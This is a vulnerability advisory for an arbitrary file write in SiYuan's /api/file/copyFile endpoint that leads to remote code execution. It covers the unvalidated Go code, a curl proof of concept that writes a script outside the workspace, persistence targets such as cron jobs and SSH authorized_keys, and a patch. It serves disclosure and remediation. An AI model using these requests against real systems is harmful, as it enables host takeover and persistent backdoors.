# [C] SiYuan has Arbitrary File Write via /api/file/copyFile leading to RCE

## Summary
Severity: Critical
Advisory: GHSA-c4jr-5q7w-f6r9
CVE: CVE-2026-25539
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-29
Source: https://github.com/advisories/GHSA-c4jr-5q7w-f6r9
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
## Summary

The `/api/file/copyFile` endpoint does not validate the `dest` parameter, allowing authenticated users to write files to arbitrary locations on the filesystem. This can lead to Remote Code Execution (RCE) by writing to sensitive locations such as cron jobs, SSH authorized_keys, or shell configuration files.

- Affected Version: 3.5.3 (and likely all prior versions)

## Details

- Type: Improper Limitation of a Pathname to a Restricted Directory (CWE-22)
- Location: `kernel/api/file.go` - copyFile function

```go
// kernel/api/file.go lines 94-139
func copyFile(c *gin.Context) {
    // ...
    src := arg["src"].(string)
    src, err := model.GetAssetAbsPath(src)  // src is validated
    // ...

    dest := arg["dest"].(string)  // dest is NOT validated!
    if err = filelock.Copy(src, dest); err != nil {
        // ...
    }
}
```

The `src` parameter is properly validated via `model.GetAssetAbsPath()`, but the `dest` parameter accepts any absolute path without validation, allowing files to be written outside the workspace directory.

## PoC

### Step 1: Upload malicious content to workspace

```bash
curl -X POST "http://target:6806/api/file/putFile" \
  -H "Authorization: Token <API_TOKEN>" \
  -F "path=/data/assets/malicious.sh" \
  -F "file=@-;filename=malicious.sh" <<< '#!/bin/sh
id > /tmp/pwned.txt
hostname >> /tmp/pwned.txt'
```

### Step 2: Copy to arbitrary location (e.g., /tmp)

```bash
curl -X POST "http://target:6806/api/file/copyFile" \
  -H "Authorization: Token <API_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"src": "assets/malicious.sh", "dest": "/tmp/malicious.sh"}'
```

Response: `{"code":0,"msg":"","data":null}`

### Step 3: Verify file was written outside workspace

```bash
cat /tmp/malicious.sh
# Output: #!/bin/sh
#         id > /tmp/pwned.txt
#         hostname >> /tmp/pwned.txt
```

## Attack Scenarios

| Target Path | Impact |
|-------------|--------|
| `/etc/cron.d/backdoor` | Scheduled command execution (RCE) |
| `~/.ssh/authorized_keys` | Persistent SSH access |
| `~/.bashrc` | Command execution on user login |
| `/etc/ld.so.preload` | Shared library injection |

### RCE Demonstration

 RCE was successfully demonstrated by writing a script and executing it:

```bash
# Write script to /tmp
curl -X POST "http://target:6806/api/file/copyFile" \
  -H "Authorization: Token <API_TOKEN>" \
  -d '{"src": "assets/malicious.sh", "dest": "/tmp/malicious.sh"}'

# Execute (simulating cron or login trigger)
sh /tmp/malicious.sh

# Result
cat /tmp/pwned.txt
# uid=0(root) gid=0(root) groups=0(root)...
```

## Impact

An authenticated attacker (with API Token) can:
1. Achieve Remote Code Execution with the privileges of the SiYuan process
2. Establish persistent backdoor access via SSH keys
3. Compromise the entire host system
4. Access sensitive data on the same network (lateral movement)

## Suggested Fix

Add path validation to ensure `dest` is within the workspace directory:

```go
func copyFile(c *gin.Context) {
    // ...
    dest := arg["dest"].(string)

    // Add validation
    if !util.IsSubPath(util.WorkspaceDir, dest) {
        ret.Code = -1
        ret.Msg = "dest path must be within workspace"
        return
    }

    if err = filelock.Copy(src, dest); err != nil {
        // ...
    }
}
```

## Solution

d7f790755edf8c78d2b4176171e5a0cdcd720feb

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c4jr-5q7w-f6r9
- https://nvd.nist.gov/vuln/detail/CVE-2026-25539
- https://github.com/siyuan-note/siyuan/commit/d7f790755edf8c78d2b4176171e5a0cdcd720feb
- https://github.com/siyuan-note/siyuan
